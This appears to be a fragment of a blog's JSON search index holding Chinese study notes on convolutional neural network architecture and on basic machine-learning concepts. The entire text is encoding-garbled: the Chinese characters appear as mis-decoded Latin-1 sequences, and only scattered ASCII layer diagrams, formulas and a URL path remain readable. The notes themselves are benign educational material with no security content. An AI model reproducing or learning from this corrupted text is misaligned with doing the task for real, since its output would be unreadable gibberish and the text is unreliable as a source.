åŒ–å±‚ï¼Œç„¶åé‡å¤å¦‚æ­¤ç›´åˆ°å›¾åƒåœ¨ç©ºé—´ä¸Šè¢«ç¼©å°åˆ°ä¸€ä¸ªè¶³å¤Ÿå°çš„å°ºå¯¸ï¼Œåœ¨æŸä¸ªåœ°æ–¹è¿‡æ¸¡æˆæˆå…¨è¿æ¥å±‚ä¹Ÿè¾ƒä¸ºå¸¸è§ã€‚æœ€åçš„å…¨è¿æ¥å±‚å¾—åˆ°è¾“å‡ºï¼Œæ¯”å¦‚åˆ†ç±»è¯„åˆ†ç­‰ã€‚æ¢å¥è¯è¯´ï¼Œæœ€å¸¸è§çš„å·ç§¯ç¥ç»ç½‘ç»œç»“æ„å¦‚ä¸‹ï¼š å…¶ä¸­*æŒ‡çš„æ˜¯é‡å¤æ¬¡æ•°ï¼ŒPOOL?æŒ‡çš„æ˜¯ä¸€ä¸ªå¯é€‰çš„æ± åŒ–å±‚ã€‚å…¶ä¸­N&gt;=0,é€šå¸¸N&lt;=3ï¼ŒM&gt;=0ï¼ŒK&gt;=0ï¼ŒK&lt;3ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„ç½‘ç»œç»“æ„è§„å¾‹ï¼š INPUT -&gt; FC ï¼šå®ç°ä¸€ä¸ªçº¿æ€§åˆ†ç±»å™¨ï¼Œæ­¤å¤„N = M = K = 0ï¼› INPUT -&gt; CONV -&gt; RELU -&gt; FCï¼šå•å±‚çš„å·ç§¯ç¥ç»ç½‘ç»œï¼› INPUT -&gt; [CONV -&gt; RELU -&gt; POOL]*2 -&gt; FC -&gt; RELU -&gt; FCï¼šæ­¤å¤„åœ¨æ¯ä¸ªæ±‡èšå±‚ä¹‹é—´æœ‰ä¸€ä¸ªå·ç§¯å±‚ï¼Œè¿™ç§ç½‘ç»œå°±æ˜¯ç®€å•çš„å¤šå±‚çš„å·ç§¯ç¥ç»ç½‘ç»œï¼› INPUT -&gt; [CONV -&gt; RELU -&gt; CONV -&gt; RELU -&gt; POOL]*3 -&gt; [FC -&gt; RELU]*2 -&gt; FCï¼šæ­¤å¤„æ¯ä¸ªæ±‡èšå±‚å‰æœ‰ä¸¤ä¸ªå·ç§¯å±‚ï¼Œè¿™ä¸ªæ€è·¯é€‚ç”¨äºæ›´å¤§æ›´æ·±çš„ç½‘ç»œï¼Œå› ä¸ºåœ¨æ‰§è¡Œå…·æœ‰ç ´åæ€§çš„æ±‡èšæ“ä½œå‰ï¼Œå¤šé‡çš„å·ç§¯å±‚å¯ä»¥ä»è¾“å…¥æ•°æ®ä¸­å­¦ä¹ åˆ°æ›´å¤šçš„å¤æ‚ç‰¹å¾ã€‚ å·ç§¯å±‚çš„å¤§å°é€‰æ‹©å‡ ä¸ªå°æ»¤æ³¢å™¨å·ç§¯å±‚çš„ç»„åˆæ¯”ä¸€ä¸ªå¤§æ»¤æ³¢å™¨å·ç§¯å±‚å¥½ã€‚å‡è®¾ä½ ä¸€å±‚ä¸€å±‚åœ°é‡å äº†3ä¸ª3*3çš„å·ç§¯å±‚ï¼ˆå±‚ä¸å±‚ä¹‹é—´æœ‰ReLUæ¿€æ´»å‡½æ•°ï¼‰ã€‚åœ¨è¿™ä¸ªæ’åˆ—ä¸‹ï¼Œç¬¬ä¸€ä¸ªå·ç§¯å±‚ä¸­çš„æ¯ä¸ªç¥ç»å…ƒéƒ½å¯¹è¾“å…¥æ•°æ®ä½“æœ‰ä¸€ä¸ª3*3çš„è§†é‡ã€‚ç¬¬äºŒä¸ªå·ç§¯å±‚ä¸Šçš„ç¥ç»å…ƒå¯¹ç¬¬ä¸€ä¸ªå·ç§¯å±‚æœ‰ä¸€ä¸ª3*3çš„è§†é‡ï¼Œä¹Ÿå°±æ˜¯å¯¹è¾“å…¥æ•°æ®ä½“æœ‰5*5çš„è§†é‡ã€‚åŒæ ·ï¼Œåœ¨ç¬¬ä¸‰ä¸ªå·ç§¯å±‚ä¸Šçš„ç¥ç»å…ƒå¯¹ç¬¬äºŒä¸ªå·ç§¯å±‚æœ‰3*3çš„è§†é‡ï¼Œä¹Ÿå°±æ˜¯å¯¹è¾“å…¥æ•°æ®ä½“æœ‰7*7çš„è§†é‡ã€‚ å‡è®¾ä¸é‡‡ç”¨è¿™3ä¸ª3*3çš„å·ç§¯å±‚ï¼Œè€Œæ˜¯ä½¿ç”¨ä¸€ä¸ªå•ç‹¬çš„æœ‰7*7çš„æ„Ÿå—é‡çš„å·ç§¯å±‚ï¼Œé‚£ä¹ˆæ‰€æœ‰ç¥ç»å…ƒçš„æ„Ÿå—é‡ä¹Ÿæ˜¯7*7ã€‚å¤šä¸ªå·ç§¯å±‚ä¸éçº¿æ€§çš„æ¿€æ´»å±‚äº¤æ›¿çš„ç»“æ„ï¼Œæ¯”å•ä¸€å·ç§¯å±‚çš„ç»“æ„æ›´èƒ½æå–å‡ºæ·±å±‚çš„æ›´å¥½çš„ç‰¹å¾ã€‚ä½†æ˜¯ä¹Ÿä¼šæœ‰ä¸€äº›ç¼ºç‚¹ï¼Œå‡è®¾æ‰€æœ‰çš„æ•°æ®æœ‰Cä¸ªé€šé“ï¼Œé‚£ä¹ˆå•ç‹¬çš„7*7å·ç§¯å±‚å°†ä¼šåŒ…å«C*(7*7*C)=49C^2ä¸ªå‚æ•°ï¼Œè€Œ3ä¸ª3*3çš„å·ç§¯å±‚çš„ç»„åˆä»…æœ‰3*(C*(3*3*C))=27C^2ä¸ªå‚æ•° ç›´è§‚è¯´æ¥ï¼Œæœ€å¥½é€‰æ‹©å¸¦æœ‰å°æ»¤æ³¢å™¨çš„å·ç§¯å±‚ç»„åˆï¼Œè€Œä¸æ˜¯ç”¨ä¸€ä¸ªå¸¦æœ‰å¤§çš„æ»¤æ³¢å™¨çš„å·ç§¯å±‚ã€‚å‰è€…å¯ä»¥è¡¨è¾¾å‡ºè¾“å…¥æ•°æ®ä¸­æ›´å¤šä¸ªå¼ºåŠ›ç‰¹å¾ï¼Œä½¿ç”¨çš„å‚æ•°ä¹Ÿæ›´å°‘ã€‚å”¯ä¸€çš„ä¸è¶³æ˜¯ï¼Œåœ¨è¿›è¡Œåå‘ä¼ æ’­æ—¶ï¼Œä¸­é—´çš„å·ç§¯å±‚å¯èƒ½ä¼šå¯¼è‡´å ç”¨æ›´å¤šçš„å†…å­˜ã€‚ å±‚çš„å°ºå¯¸è®¾ç½®å„å±‚å¸¸è§çš„å°ºå¯¸è®¾ç½®å¦‚ä¸‹ï¼š è¾“å…¥å±‚ï¼šåº”è¯¥èƒ½è¢«2æ•´é™¤å¾ˆå¤šæ¬¡ã€‚å¸¸ç”¨æ•°å­—åŒ…æ‹¬32ï¼Œ64ï¼Œ96æˆ–224ï¼ˆæ¯”å¦‚ImageNetå·ç§¯ç¥ç»ç½‘ç»œï¼‰ï¼Œ384å’Œ512ã€‚ å·ç§¯å±‚ï¼šåº”è¯¥ä½¿ç”¨å°å°ºå¯¸æ»¤æ³¢å™¨ï¼ˆæ¯”å¦‚3*3æˆ–æœ€å¤š5*5ï¼‰ï¼Œä½¿ç”¨æ­¥é•¿S=1ã€‚è¿˜æœ‰ä¸€ç‚¹éå¸¸é‡è¦ï¼Œå°±æ˜¯å¯¹è¾“å…¥æ•°æ®è¿›è¡Œé›¶å¡«å……ï¼Œè¿™æ ·å·ç§¯å±‚å°±ä¸ä¼šæ”¹å˜è¾“å…¥æ•°æ®åœ¨ç©ºé—´ç»´åº¦ä¸Šçš„å°ºå¯¸ã€‚æ¯”å¦‚ï¼Œå½“F=3ï¼Œé‚£å°±ä½¿ç”¨P=1æ¥ä¿æŒè¾“å…¥å°ºå¯¸ã€‚å½“F=5ï¼ŒP=2ï¼Œä¸€èˆ¬å¯¹äºä»»æ„Fï¼Œå½“P=(F-1)/2çš„æ—¶å€™èƒ½ä¿æŒè¾“å…¥å°ºå¯¸ã€‚å¦‚æœå¿…é¡»ä½¿ç”¨æ›´å¤§çš„æ»¤æ³¢å™¨å°ºå¯¸ï¼ˆæ¯”å¦‚7*7ä¹‹ç±»ï¼‰ï¼Œé€šå¸¸åªç”¨åœ¨ç¬¬ä¸€ä¸ªé¢å¯¹åŸå§‹å›¾åƒçš„å·ç§¯å±‚ä¸Šã€‚ æ± åŒ–å±‚ï¼šè´Ÿè´£å¯¹è¾“å…¥æ•°æ®çš„ç©ºé—´ç»´åº¦è¿›è¡Œé™é‡‡æ ·ã€‚æœ€å¸¸ç”¨çš„è®¾ç½®æ˜¯ç”¨2*2æ„Ÿå—é‡ï¼ˆå³F=2ï¼‰çš„æœ€å¤§å€¼æ± åŒ–ï¼Œæ­¥é•¿ä¸ºS=2ã€‚æ³¨æ„è¿™ä¸€æ“ä½œå°†ä¼šæŠŠè¾“å…¥æ•°æ®ä¸­75%çš„æ¿€æ´»æ•°æ®ä¸¢å¼ƒï¼ˆå› ä¸ºå¯¹å®½åº¦å’Œé«˜åº¦éƒ½è¿›è¡Œäº†2çš„ä¸‹é‡‡æ ·ï¼‰ã€‚å¦ä¸€ä¸ªä¸é‚£ä¹ˆå¸¸ç”¨çš„è®¾ç½®æ˜¯ä½¿ç”¨3*3çš„æ„Ÿå—é‡ï¼Œæ­¥é•¿ä¸º2ã€‚æœ€å¤§å€¼æ± åŒ–çš„æ„Ÿå—é‡å°ºå¯¸å¾ˆå°‘æœ‰è¶…è¿‡3çš„ï¼Œå› ä¸ºæ± åŒ–æ“ä½œè¿‡åº¦ï¼Œæ˜“é€ æˆæ•°æ®ä¿¡æ¯ä¸¢å¤±ï¼Œè¿™é€šå¸¸ä¼šå¯¼è‡´ç®—æ³•æ€§èƒ½å˜å·®ã€‚ è‡³æ­¤ï¼Œå¯¹å·ç§¯ç¥ç»ç½‘ç»œçš„å­¦ä¹ åˆ°æ­¤å‘Šä¸€æ®µè½ï¼Œå¾ˆå¤šæ·±å±‚æ¬¡çš„åœ°æ–¹å…¶å®è¿˜æ²¡ææ‡‚ï¼Œåœ¨ä»¥åçš„å®è·µä¸­å†åŠ æ·±å­¦ä¹ å§ã€‚ å‚è€ƒï¼šå·ç§¯ç¥ç»ç½‘ç»œå…¥é—¨è¯¦è§£æå®æ¯…æœºå™¨å­¦ä¹ æ•™å­¦è§†é¢‘","link":"/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"title":"æœºå™¨å­¦ä¹ åŸºæœ¬çŸ¥è¯†","text":"æœ€è¿‘ç”±äºä¸€äº›éœ€è¦åœ¨å­¦ä¹ æœºå™¨å­¦ä¹ ï¼ŒBç«™ä¸Šæ‰¾äº†ä¸€ä¸ªç³»åˆ—çš„è§†é¢‘ï¼Œæ„Ÿè§‰è¿˜è¡Œï¼Œå¯¹æœºå™¨å­¦ä¹ ã€æ·±åº¦å­¦ä¹ å¥½å¥½å­¦ä¹ å­¦ä¹ ï¼Œåšä¸€äº›ç®€å•çš„è®°å½•ã€‚ æœºå™¨å­¦ä¹ æœºå™¨å­¦ä¹ ï¼ˆMachine Learning, MLï¼‰æ˜¯å¤šé¢†åŸŸäº¤å‰å­¦ç§‘ï¼Œæ¶‰åŠæ¦‚ç‡è®ºã€ç»Ÿè®¡å­¦ã€é€¼è¿‘è®ºã€å‡¸åˆ†æã€ç®—æ³•å¤æ‚åº¦ç†è®ºç­‰å¤šé—¨å­¦ç§‘ã€‚ä¸“é—¨ç ”ç©¶è®¡ç®—æœºæ€æ ·æ¨¡æ‹Ÿæˆ–å®ç°äººç±»çš„å­¦ä¹ è¡Œä¸ºï¼Œä»¥è·å–æ–°çš„çŸ¥è¯†æˆ–è€…æŠ€èƒ½ï¼Œé‡æ–°ç»„ç»‡å·²æœ‰çš„çŸ¥è¯†ç»“æ„ä½¿ä¹‹ä¸æ–­æ”¹å–„è‡ªèº«çš„æ€§èƒ½ã€‚æœºå™¨å­¦ä¹ æ˜¯äººå·¥æ™ºèƒ½çš„æ ¸å¿ƒï¼Œæ˜¯ä½¿è®¡ç®—æœºå…·æœ‰æ™ºèƒ½çš„æ ¹æœ¬é€”å¾„ï¼Œå…¶åº”ç”¨éåŠäººå·¥æ™ºèƒ½çš„å„ä¸ªé¢†åŸŸï¼Œä¸»è¦ä½¿ç”¨å½’çº³ã€ç»¼åˆè€Œä¸æ˜¯æ¼”ç»ã€‚æœºå™¨å­¦ä¹ ã€æœºå™¨å­¦ä¹ ï¼Œé‚£ä¹ˆè¿™é‡Œçš„å­¦ä¹ åˆ°åº•æŒ‡ä»€ä¹ˆæ ·çš„ä¸€ä¸ªè¿‡ç¨‹å‘¢ï¼Ÿ å­¦ä¹ ï¼šé’ˆå¯¹ç»éªŒEå’Œä¸€ç³»åˆ—ä»»åŠ¡Tä»¥åŠä¸€å®šè¡¨ç°çš„è¡¡é‡Pï¼Œå¦‚æœéšä¹‹ç»éªŒEçš„ç§¯ç´¯ï¼Œé’ˆå¯¹å®šä¹‰å¥½çš„ä»»åŠ¡Tå¯ä»¥æé«˜è¡¨ç°Pï¼Œå°±è¯´æ˜è®¡ç®—æœºå…·æœ‰å­¦ä¹ èƒ½åŠ›ã€‚ æœºå™¨å­¦ä¹ è¢«è¿™æ ·å®šä¹‰ï¼šæ¢ç©¶å’Œå¼€å‘ä¸€ç³»åˆ—ç®—æ³•æ¥å¦‚ä½•ä½¿è®¡ç®—æœºä¸éœ€è¦é€šè¿‡å¤–éƒ¨æ˜æ˜¾åœ°çŸ¥è¯†ï¼Œè€Œå¯ä»¥é€šè¿‡æ•°æ®è¿›è¡Œå­¦ä¹ ã€å»ºæ¨¡ï¼Œå¹¶ä¸”åˆ©ç”¨å»ºç«‹çš„æ¨¡å‹å¯¹æ–°è¾“å…¥çš„æ•°æ®è¿›è¡Œé¢„æµ‹çš„å­¦ç§‘ã€‚ å½“ä»Šï¼Œæœºå™¨å­¦ä¹ å·²ç»å¹¿ä¸ºï¼Œç°åœ¨å¸¸è§å¹¶ä¸”ç«çƒ­çš„åº”ç”¨å¦‚ä¸‹ï¼š è¯­éŸ³è¯†åˆ« è‡ªåŠ¨é©¾é©¶ è¯­è¨€ç¿»è¯‘ è®¡ç®—æœºè§†è§‰ æ¨èç³»ç»Ÿ æ— äººæœº åƒåœ¾é‚®ä»¶è¯†åˆ« ä¸€äº›åŸºæœ¬æ¦‚å¿µæœºå™¨å­¦ä¹ ã€åŒ…æ‹¬ä¸‹é¢æåˆ°çš„æ·±åº¦å­¦ä¹ éƒ½æœ‰è‡ªå·±çš„ä¸€äº›å…ƒç´ ï¼Œä¹Ÿç®—æ˜¯ä¸€äº›æ¦‚å¿µï¼Œä¸»è¦æ˜¯ï¼šè®­ç»ƒé›†ã€æµ‹è¯•é›†ã€ç‰¹å¾å€¼ã€ç›‘ç£å­¦ä¹ ã€éç›‘ç£å­¦ä¹ ã€åŠç›‘ç£å­¦ä¹ ã€åˆ†ç±»ã€å›å½’ã€‚ä¸‹é¢å¯¹ä¸»è¦æ¦‚å¿µè¿›è¡Œè§£é‡Šï¼š æ¦‚å¿µå­¦ä¹ ï¼šä»æœ‰å…³æŸä¸ªå¸ƒå°”å‡½æ•°çš„è¾“å…¥è¾“å‡ºè®­ç»ƒæ ·ä¾‹ä¸­æ¨æ–­å‡ºè¯¥å¸ƒå°”å‡½æ•°ï¼Œæ¦‚å¿µå®šä¹‰åœ¨å®ä¾‹é›†åˆä¹‹ä¸Šï¼›è®­ç»ƒé›†ï¼ˆtraining setï¼‰ï¼šåˆç§°è®­ç»ƒæ ·ä¾‹ï¼Œç”¨æ¥è®­ç»ƒã€äº§ç”Ÿæ¨¡å‹æˆ–ç®—æ³•çš„æ•°æ®é›†ï¼›æµ‹è¯•é›†ï¼ˆtesting setï¼‰ï¼šåˆç§°æµ‹è¯•æ ·ä¾‹ï¼Œä¸“é—¨ç”¨æ¥æµ‹è¯•è®­ç»ƒå¥½çš„æ¨¡å‹æˆ–ç®—æ³•çš„æ•°æ®é›†ï¼›ç‰¹å¾å‘é‡ï¼ˆfeature vectorï¼‰ï¼šå±æ€§çš„é›†åˆï¼Œé€šå¸¸ç”¨ä¸€ä¸ªå‘é‡æ¥è¡¨ç¤ºï¼Œé™„å±äºä¸€ä¸ªå®ä¾‹ï¼›æ ‡è®°ï¼ˆlabelï¼‰ï¼šå®ä¾‹ç±»åˆ«çš„æ ‡è®°ï¼Œå³ç»“æœçš„ç±»å‹ï¼ŒåŒ…æ‹¬æ­£ä¾‹ï¼ˆpositive exampleï¼‰å’Œåä¾‹ï¼ˆnegative exampleï¼‰;åˆ†ç±»ï¼ˆclassificationï¼‰ï¼šç›®æ ‡æ ‡è®°ä¸ºç±»åˆ«å‹æ•°æ®ï¼ˆcategoryï¼‰;å›å½’ï¼ˆregressionï¼‰ï¼šç›®æ ‡æ ‡è®°ä¸ºè¿ç»­æ€§æ•°å€¼ï¼ˆcontinuous numeric valueï¼‰;æœ‰ç›‘ç£å­¦ä¹ ï¼ˆsupervised learningï¼‰ï¼šè®­ç»ƒé›†æ•°æ®æœ‰ç±»åˆ«æ ‡è®°ï¼Œå³è®­ç»ƒé›†çš„æ ·ä¾‹å­˜åœ¨æœ€ç»ˆçš„ç»“æœï¼›æ— ç›‘ç£å­¦ä¹ ï¼ˆunsupervised learningï¼‰ï¼šè®­ç»ƒé›†æ•°æ®æ— ç±»åˆ«æ ‡è®°ï¼›åŠç›‘ç£å­¦ä¹ ï¼ˆsemi-supervised learningï¼‰ï¼šè®­ç»ƒé›†æ•°æ®éƒ¨åˆ†æœ‰ç±»åˆ«æ ‡è®°ã€éƒ¨åˆ†æ²¡æœ‰ç±»åˆ«æ ‡è®°ã€‚ æœºå™¨å­¦ä¹ æ­¥éª¤ 1ã€æŠŠæ•°æ®é›†æ‹†åˆ†ä¸ºè®­ç»ƒé›†å’Œæµ‹è¯•é›† 2ã€ç”¨è®­ç»ƒé›†å’Œè®­ç»ƒé›†çš„ç‰¹å¾å‘é‡æ¥è®­ç»ƒç®—æ³• 3ã€ç”¨è®­ç»ƒå‡ºçš„ç®—æ³•åœ¨æµ‹è¯•é›†ä¸Šè¿›è¡Œè¯„ä¼°ï¼ˆå¯èƒ½æ¶‰åŠè°ƒæ•´å‚æ•°ï¼Œç”¨åˆ°éªŒè¯é›†ï¼ˆparameter setï¼‰ï¼‰ ç®—æ³•è¯„ä¼°å¯¹ä¸€ä¸ªæœºå™¨å­¦ä¹ ç®—æ³•æ€§èƒ½çš„è¯„ä¼°ï¼Œä¸»è¦è€ƒè™‘ä¸€ä¸‹äº”ä¸ªæ–¹é¢ï¼š 1ã€å‡†ç¡®ç‡ï¼šæ‰§è¡Œç»“æœçš„å‡†ç¡®åº¦ 2ã€é€Ÿåº¦ï¼šæ‰§è¡Œé€Ÿåº¦çš„å¿«æ…¢ 3ã€å¼ºå£®æ€§ï¼šæ•°æ®çš„ä¸ªåˆ«å€¼ç¼ºå¤±æ—¶èƒ½å¦å¯¹æ•°æ®è¿›è¡Œå‡†ç¡®å¤„ç† 4ã€å¯è§„æ¨¡æ€§ï¼šæ•°æ®é›†å¾ˆå¤§çš„æ—¶å€™ç®—æ³•æ˜¯å¦ä»ç„¶æœ‰æ•ˆ 5ã€å¯è§£é‡Šæ€§ï¼šç®—æ³•å¤„ç†æ•°æ®çš„ç»“æœå¯è§£é‡Šçš„ç¨‹åº¦ æ·±åº¦å­¦ä¹ äº†è§£äº†æœºå™¨å­¦ä¹ çš„åŸºæœ¬çŸ¥è¯†ï¼Œå†å¾€æ·±é‡Œè¯´æ˜¯æ·±åº¦å­¦ä¹ ï¼ˆDeep Learning, DLï¼‰ï¼Œå®ƒæ˜¯åŸºäºæœºå™¨å­¦ä¹ å»¶ä¼¸å‡ºçš„ä¸€ä¸ªæ–°é¢†åŸŸï¼Œç”±ä»¥äººè„‘ç»“æ„ä¸ºå¯å‘çš„ç¥ç»ç½‘ç»œç®—æ³•ï¼ˆNNsï¼‰ä¸ºèµ·æºåŠ ä¹‹æ¨¡å‹ç»“æ„æ·±åº¦çš„å¢åŠ å‘å±•ï¼Œå¹¶ä¼´éšå¤§æ•°æ®å’Œè®¡ç®—èƒ½åŠ›çš„æé«˜è€Œäº§ç”Ÿçš„ä¸€ç³»åˆ—ç®—æ³•ã€‚æ·±åº¦å­¦ä¹ è¢«å¹¿æ³›åº”ç”¨äºå›¾åƒå¤„ç†ä¸è®¡ç®—æœºè§†è§‰ã€è‡ªç„¶è¯­è¨€å¤„ç†ä»¥åŠè¯­éŸ³è¯†åˆ«ç­‰é¢†åŸŸã€‚ å¯¹äºæ·±åº¦å­¦ä¹ ï¼Œä¸»è¦å¯¹ç¥ç»ç½‘ç»œç›¸å…³çš„ç®—æ³•è¿›è¡Œå­¦ä¹ ï¼Œè¿™ä¹Ÿæ˜¯ç›®å‰åº”ç”¨æœ€ä¸ºå¹¿æ³›çš„æœºå™¨å­¦ä¹ ç®—æ³•äº†ã€‚ ç¥ç»ç½‘ç»œç¥ç»ç½‘ç»œï¼ˆNNsï¼‰ï¼Œä¹Ÿç§°äººå·¥ç¥ç»ç½‘ç»œï¼ˆArtificial Neural Networksï¼Œç®€å†™ä¸ºANNsï¼‰æˆ–ç§°ä½œè¿æ¥æ¨¡å‹ï¼ˆConnection Modelï¼‰ï¼Œå®ƒæ˜¯ä¸€ç§æ¨¡ä»¿åŠ¨ç‰©ç¥ç»ç½‘ç»œè¡Œä¸ºç‰¹å¾ï¼Œè¿›è¡Œåˆ†å¸ƒå¼å¹¶è¡Œä¿¡æ¯å¤„ç†çš„ç®—æ³•æ•°å­¦æ¨¡å‹ã€‚è¿™ç§ç½‘ç»œä¾é ç³»ç»Ÿçš„å¤æ‚ç¨‹åº¦ï¼Œé€šè¿‡è°ƒæ•´å†…éƒ¨å¤§é‡èŠ‚ç‚¹ä¹‹é—´ç›¸äº’è¿æ¥çš„å…³ç³»ï¼Œä»è€Œè¾¾åˆ°å¤„ç†ä¿¡æ¯çš„ç›®çš„ã€‚ å®ƒæœºå™¨å­¦ä¹ å¾—ä»¥å‘å±•å‡ºæ·±åº¦å­¦ä¹ çš„å…³é”®æ‰€åœ¨ï¼Œä»¥äººè„‘ä¸­çš„ç¥ç»ç½‘ç»œä¸ºå¯å‘äº§ç”Ÿçš„æœºå™¨å­¦ä¹ ç®—æ³•ã€‚ å¤šå±‚å‘å‰ç¥ç»ç½‘ç»œ(Muiltilayer Feed-Forward Neural Network)ä¸»è¦æœ‰ä¸‰éƒ¨åˆ†ç»„æˆï¼šè¾“å…¥å±‚ï¼ˆinput layerï¼‰ï¼Œéšè—å±‚ï¼ˆhidden layersï¼‰ï¼Œè¾“å‡ºå±‚ï¼ˆoutput layerï¼‰ æ¯å±‚ç”±å•å…ƒï¼ˆunitï¼Œä¹Ÿç§°ä¸ºç¥ç»å…ƒï¼‰ç»„æˆï¼Œè¾“å…¥å±‚å°†è®­ç»ƒé›†çš„å®ä¾‹ç‰¹å¾å‘é‡è¿›è¡Œä¼ å…¥ï¼Œç»è¿‡è¿æ¥ç»“ç‚¹çš„æƒé‡ï¼ˆweightï¼‰ä¼ å…¥ä¸‹ä¸€å±‚ï¼Œä¸Šä¸€å±‚çš„è¾“å‡ºæ˜¯ä¸‹ä¸€å±‚çš„è¾“å…¥ã€‚éšè—å±‚çš„æ•°é‡æ˜¯ä»»æ„çš„ï¼Œè¾“å…¥å±‚å’Œè¾“å‡ºå±‚åªæœ‰ä¸€å±‚ï¼Œä¸è¿‡ä¸€èˆ¬ç®—å±‚æ•°æ—¶ä¸å°†è¾“å…¥å±‚è®¡ç®—åœ¨å†…ã€‚ å…¶å·¥ä½œè¿‡ç¨‹å¤§è‡´æ˜¯ï¼šå°†è¾“å…¥çš„å®ä¾‹å€¼è¿›è¡ŒåŠ æƒæ±‚å’Œï¼Œå†ç»è¿‡éçº¿æ€§æ–¹ç¨‹è½¬åŒ–è¾“å‡ºåˆ°ä¸‹ä¸€å±‚ã€‚ç†è®ºä¸Šè®²ï¼Œå½“éšè—å±‚è¶³å¤Ÿå¤šã€è®­ç»ƒé›†è¶³å¤Ÿå¤§æ—¶ï¼Œå¯ä»¥æ¨¡æ‹Ÿå‡ºä»»ä½•æ–¹ç¨‹ã€‚ è®¾è®¡ç¥ç»ç½‘ç»œç»“æ„ä½¿ç”¨ç¥ç»ç½‘ç»œè®­ç»ƒæ•°æ®ä¹‹å‰ï¼Œå¿…é¡»ç¡®å®šç¥ç»ç½‘ç»œçš„å±‚æ•°ï¼Œä»¥åŠæ¯å±‚å•å…ƒçš„ä¸ªæ•°ã€‚ ç‰¹å¾å‘é‡åœ¨è¢«ä¼ å…¥è¾“å…¥å±‚æ—¶é€šå¸¸è¢«å…ˆæ ‡å‡†åŒ–ï¼ˆnormalizeï¼‰åˆ°0å’Œ1ä¹‹é—´ï¼Œç›®çš„æ˜¯åŠ é€Ÿå­¦ä¹ çš„è¿‡ç¨‹ï¼Œä½†æ˜¯è¾“å…¥çš„ç‰¹å¾å€¼ç±»å‹å¯èƒ½æ˜¯ç¦»æ•£å‹çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯è¿ç»­å‹çš„ã€‚å¯¹äºç¦»æ•£å‹çš„å˜é‡ï¼Œå¯ä»¥é€šè¿‡ç¼–ç æˆæ¯ä¸€ä¸ªè¾“å…¥å•å…ƒå¯¹åº”ä¸€ä¸ªç‰¹å¾å€¼å¯èƒ½èµ‹çš„å€¼ã€‚ä¾‹å¦‚ ç‰¹å¾å€¼Aå¯èƒ½å–ä¸‰ä¸ªå€¼ï¼ˆa0ã€a1ã€a2ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨3ä¸ªè¾“å…¥å•å…ƒæ¥è¡¨ç¤ºAã€‚å¦‚æœA=a0ï¼Œåˆ™è¡¨ç¤ºa0çš„å•å…ƒå€¼å–1ï¼Œå…¶ä½™å–0ï¼›å¦‚æœA=a1ï¼Œåˆ™è¡¨ç¤ºa1çš„å•å…ƒå€¼å–1ï¼Œå…¶ä½™å–0ã€‚ ç¥ç»ç½‘ç»œæ—¢å¯ä»¥è§£å†³åˆ†ç±»é—®é¢˜ï¼Œä¹Ÿå¯ä»¥è§£å†³å›å½’é—®é¢˜ã€‚åˆ†ç±»é—®é¢˜å³ä¸ºç»“æœæ˜¯ç¦»æ•£å‹çš„é—®é¢˜ï¼Œæ¯”å¦‚é¢„æµ‹å“ªä¸ªå“ç‰Œçš„ç”µè„‘å–å¾—æ›´å¥½ï¼›å›å½’é—®é¢˜å³ç»“æœæ˜¯è¿ç»­å‹çš„é—®é¢˜ï¼Œæ¯”å¦‚é¢„æµ‹æŸåœ°çš„æˆ¿ä»·ã€‚åˆ†ç±»é—®é¢˜å±…å¤šï¼Œå› æ­¤ä¸»è¦å­¦ä¹ åˆ†ç±»é—®é¢˜çš„è§£å†³ï¼Œå¯¹äºè¯¥ç±»é—®é¢˜ï¼Œå¦‚æœæ˜¯ä¸¤ç±»ï¼Œç”¨ä¸€ä¸ªè¾“å‡ºå•å…ƒè¡¨ç¤ºå³å¯ï¼Œå³0å’Œ1ï¼›å¤šäºä¸¤ç±»åˆ™æ¯ä¸€ä¸ªç±»åˆ«ç”¨ä¸€ä¸ªè¾“å‡ºå•å…ƒè¡¨ç¤ºï¼Œå› æ­¤è¾“å‡ºå±‚çš„å•å…ƒæ•°é‡é€šå¸¸ç­‰äºç±»åˆ«çš„æ•°é‡ã€‚ å¯¹äºéšè—å±‚æ•°çš„è®¾ç½®ï¼Œå¦‚æœæ²¡æœ‰æ˜ç¡®è§„åˆ™ï¼Œåˆ™å¯ä»¥æ ¹æ®å®éªŒæµ‹è¯•å’Œè¯¯å·®ï¼Œä»¥åŠå‡†ç¡®åº¦æ¥å®éªŒå¹¶ä½œå‡ºè°ƒæ•´ã€‚å‡†ç¡®åº¦çš„æµ‹è¯•å¯ä»¥åˆ©ç”¨æµ‹è¯•é›†æ¥è¿›è¡Œæµ‹è¯•ã€‚ä¸è¿‡è¿˜æœ‰ä¸€ç§å¸¸ç”¨çš„æµ‹è¯•æ–¹æ³•ï¼šäº¤å‰éªŒè¯æ–¹æ³•ã€‚ äº¤å‰éªŒè¯æ–¹æ³•ï¼ˆCross-Validationï¼‰å°†æ•°æ®é›†åˆ†ä¸ºnä»½ï¼Œç¬¬ä¸€æ¬¡å°†ç¬¬ä¸€ä»½ä½œä¸ºæµ‹è¯•é›†å…¶ä½™ä½œä¸ºè®­ç»ƒé›†è¿›è¡Œè®­ç»ƒå’Œæµ‹è¯•ï¼Œç¬¬äºŒå±‚é€‰æ‹©ç¬¬äºŒä»½ä½œä¸ºæµ‹è¯•é›†å…¶ä½™ä½œä¸ºè®­ç»ƒé›†è¿›è¡Œè®­ç»ƒå’Œæµ‹è¯•ï¼Œä¾æ¬¡ç±»æ¨è¿›è¡Œã€‚ 